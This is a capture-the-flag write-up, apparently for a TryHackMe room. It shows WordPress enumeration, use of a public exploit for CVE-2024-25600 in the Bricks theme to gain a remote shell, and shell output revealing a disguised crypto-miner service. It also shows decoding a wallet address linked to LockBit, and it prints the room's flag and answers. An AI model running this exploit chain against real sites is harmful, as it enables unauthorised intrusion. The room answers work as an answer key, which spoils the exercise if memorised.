target:10.201.6.98
enumeration
```
nmap -A 10.201.6.98
```
![[Pasted image 20250809180727.png]]
since there is a wordpress with name "brick by brick" and the name of this room is brick it is probably where we can find vulnerability 
so lets enumerate wordpress
```
wpscan --url https://bricks.thm --disable-tls-checks
```
running with tls-checks wont work
![[Pasted image 20250809181711.png]]
here another reference to brick lets see if this theme has any vulnerability
search for bricks 1.9.5 vulnerability and you will see a RCE and in the room you can see RCE CVE as key so it is probably the corrrect path
CVE
> CVE-2024-25600
https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT
i used the code form this repo
```
python CVE-2024-25600.py --url https://bricks.thm --threads 10
```
you also need to install some modules
1. alive_progress
2. bs4
3. prompt_toolkit
4. requests
5. rich
install it using pip or pip3 install and if not able to install create a python environment
running the above command give us a RCE shell
![[Pasted image 20250809183224.png]]
then we can get the first answer 
```
Shell> ls -la  
total 260  
drwxr-xr-x  7 apache apache  4096 Aug  9 12:34 .  
drwxr-xr-x  3 root   root    4096 Apr  2  2024 ..  
-rw-r--r--  1 apache apache   523 Apr  2  2024 .htaccess  
-rw-r--r--  1 root   root      43 Apr  5  2024 650c844110baced87e1606453b93f22a.txt  
-rw-r--r--  1 apache apache   405 Apr  2  2024 index.php  
drwxr-xr-x  7 apache apache  4096 Apr 12  2023 kod  
-rw-r--r--  1 apache apache 19915 Apr  4  2024 license.txt  
drwxr-xr-x 15 apache apache  4096 Apr  2  2024 phpmyadmin  
-rw-r--r--  1 apache apache  7401 Apr  4  2024 readme.html  
-rw-r--r--  1 apache apache  7387 Apr  4  2024 wp-activate.php  
drwxr-xr-x  9 apache apache  4096 Apr  2  2024 wp-admin  
-rw-r--r--  1 apache apache   351 Apr  2  2024 wp-blog-header.php  
-rw-r--r--  1 apache apache  2323 Apr  2  2024 wp-comments-post.php  
-rw-r--r--  1 apache apache  3012 Apr  4  2024 wp-config-sample.php  
-rw-rw-rw-  1 apache apache  3288 Apr  2  2024 wp-config.php  
drwxr-xr-x  6 apache apache  4096 Aug  9 12:34 wp-content  
-rw-r--r--  1 apache apache  5638 Apr  2  2024 wp-cron.php  
drwxr-xr-x 30 apache apache 16384 Apr  4  2024 wp-includes  
-rw-r--r--  1 apache apache  2502 Apr  2  2024 wp-links-opml.php  
-rw-r--r--  1 apache apache  3927 Apr  2  2024 wp-load.php  
-rw-r--r--  1 apache apache 50917 Apr  4  2024 wp-login.php  
-rw-r--r--  1 apache apache  8525 Apr  2  2024 wp-mail.php  
-rw-r--r--  1 apache apache 28427 Apr  4  2024 wp-settings.php  
-rw-r--r--  1 apache apache 34385 Apr  2  2024 wp-signup.php  
-rw-r--r--  1 apache apache  4885 Apr  2  2024 wp-trackback.php  
-rw-r--r--  1 apache apache  3246 Apr  4  2024 xmlrpc.php  
  
Shell> cat 650c844110baced87e1606453b93f22a.txt  
   
THM{fl46_650c844110baced87e1606453b93f22a}
```
now we found the answer to 1 st question
lets move to second one 
```
Shell> systemctl | grep running  
 proc-sys-fs-binfmt_misc.automount                loaded active     running         Arbitrary Executable File Formats File System Automount Point                   
 acpid.path                                       loaded active     running         ACPI Events Check                                                               
 init.scope                                       loaded active     running         System and Service Manager                                                      
 session-c1.scope                                 loaded active     running         Session c1 of user lightdm                                                      
 accounts-daemon.service                          loaded active     running         Accounts Service                                                                
 acpid.service                                    loaded active     running         ACPI event daemon                                                               
 atd.service                                      loaded active     running         Deferred execution scheduler                                                    
 avahi-daemon.service                             loaded active     running         Avahi mDNS/DNS-SD Stack                                                         
 cron.service                                     loaded active     running         Regular background program processing daemon                                    
 cups-browsed.service                             loaded active     running         Make remote CUPS printers available locally                                     
 cups.service                                     loaded active     running         CUPS Scheduler                                                                  
 dbus.service                                     loaded active     running         D-Bus System Message Bus                                                        
 getty@tty1.service                               loaded active     running         Getty on tty1                                                                   
 httpd.service                                    loaded active     running         LSB: starts Apache Web Server                                                   
 irqbalance.service                               loaded active     running         irqbalance daemon                                                               
 kerneloops.service                               loaded active     running         Tool to automatically collect and submit kernel crash signatures                
 lightdm.service                                  loaded active     running         Light Display Manager                                                           
 ModemManager.service                             loaded active     running         Modem Manager                                                                   
 multipathd.service                               loaded active     running         Device-Mapper Multipath Device Controller                                       
 mysqld.service                                   loaded active     running         LSB: start and stop MySQL                                                       
 networkd-dispatcher.service                      loaded active     running         Dispatcher daemon for systemd-networkd                                          
 NetworkManager.service                           loaded active     running         Network Manager                                                                 
 polkit.service                                   loaded active     running         Authorization Manager                                                           
 rsyslog.service                                  loaded active     running         System Logging Service                                                          
 rtkit-daemon.service                             loaded active     running         RealtimeKit Scheduling Policy Service                                           
 serial-getty@ttyS0.service                       loaded active     running         Serial Getty on ttyS0                                                           
 snap.amazon-ssm-agent.amazon-ssm-agent.service   loaded active     running         Service for snap application amazon-ssm-agent.amazon-ssm-agent                  
 snapd.service                                    loaded active     running         Snap Daemon                                                                     
 ssh.service                                      loaded active     running         OpenBSD Secure Shell server                                                     
 switcheroo-control.service                       loaded active     running         Switcheroo Control Proxy service                                                
 systemd-journald.service                         loaded active     running         Journal Service                                                                 
 systemd-logind.service                           loaded active     running         Login Service                                                                   
 systemd-networkd.service                         loaded active     running         Network Service                                                                 
 systemd-resolved.service                         loaded active     running         Network Name Resolution                                                         
 systemd-timesyncd.service                        loaded active     running         Network Time Synchronization                                                    
 systemd-udevd.service                            loaded active     running         udev Kernel Device Manager                                                      
 ubuntu.service                                   loaded active     running         TRYHACK3M                                                                       
 udisks2.service                                  loaded active     running         Disk Manager                                                                    
 unattended-upgrades.service                      loaded active     running         Unattended Upgrades Shutdown                                                    
 upower.service                                   loaded active     running         Daemon for power management                                                     
 user@1000.service                                loaded active     running         User Manager for UID 1000                                                       
 user@114.service                                 loaded active     running         User Manager for UID 114                                                        
 whoopsie.service                                 loaded active     running         crash report submission daemon                                                  
 wpa_supplicant.service                           loaded active     running         WPA supplicant                                                                  
 acpid.socket                                     loaded active     running         ACPID Listen Socket                                                             
 avahi-daemon.socket                              loaded active     running         Avahi mDNS/DNS-SD Stack Activation Socket                                       
 cups.socket                                      loaded active     running         CUPS Scheduler                                                                  
 dbus.socket                                      loaded active     running         D-Bus System Message Bus Socket                                                 
 multipathd.socket                                loaded active     running         multipathd control socket                                                       
 snapd.socket                                     loaded active     running         Socket activation for snappy daemon                                             
 syslog.socket                                    loaded active     running         Syslog Socket                                                                   
 systemd-journald-audit.socket                    loaded active     running         Journal Audit Socket                                                            
 systemd-journald-dev-log.socket                  loaded active     running         Journal Socket (/dev/log)                                                       
 systemd-journald.socket                          loaded active     running         Journal Socket                                                                  
 systemd-networkd.socket                          loaded active     running         Network Service Netlink Socket                                                  
 systemd-udevd-control.socket                     loaded active     running         udev Control Socket                                                             
 systemd-udevd-kernel.socket                      loaded active     running         udev Kernel Socket
```
since i cant find answer 2 second question i moved to 3rd question and found it out to be 
```
 ubuntu.service                                   loaded active     running         TRYHACK3M 
```
then i used this to find answer to 3rd question
```
Shell> systemctl cat ubuntu.service  
   
# /etc/systemd/system/ubuntu.service  
[Unit]  
Description=TRYHACK3M  
  
[Service]  
Type=simple  
ExecStart=/lib/NetworkManager/nm-inet-dialog  
Restart=on-failure  
  
[Install]  
WantedBy=multi-user.target
```
next we have to find the miner instance
since
```
ExecStart=/lib/NetworkManager/nm-inet-dialog  
```
lets look at the ==/lib/NetworkManager== directory
and in that inet.conf has this 
![[Pasted image 20250809194008.png]]
now that we we know inet.conf is the instance lets find the associated wallet address
```
strings /lib/NetworkManager/inet.conf | grep -E '[13][a-km-zA-HJ-NP-Z1-9]{25,34}|4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}'

```
we can run this command to find id
![[Pasted image 20250809195524.png]]
it is encrypted so we have to decode it
```
echo 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d30453159556447  
6130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d | xxd -r -p | base64 -d
```
it will need to be again decrypted to get actual id 
![[Pasted image 20250809195850.png]]
`bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
and this is the wallet id
https://www.blockchain.com/explorer
then we can search this id in this website to find big amount reciver
![[Pasted image 20250809200057.png]]
then we can search for the receiver ==32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM==
in google 
![[Pasted image 20250809200252.png]]
as we can see the group is lockbit
-----------------------------------------------------------------------------------------------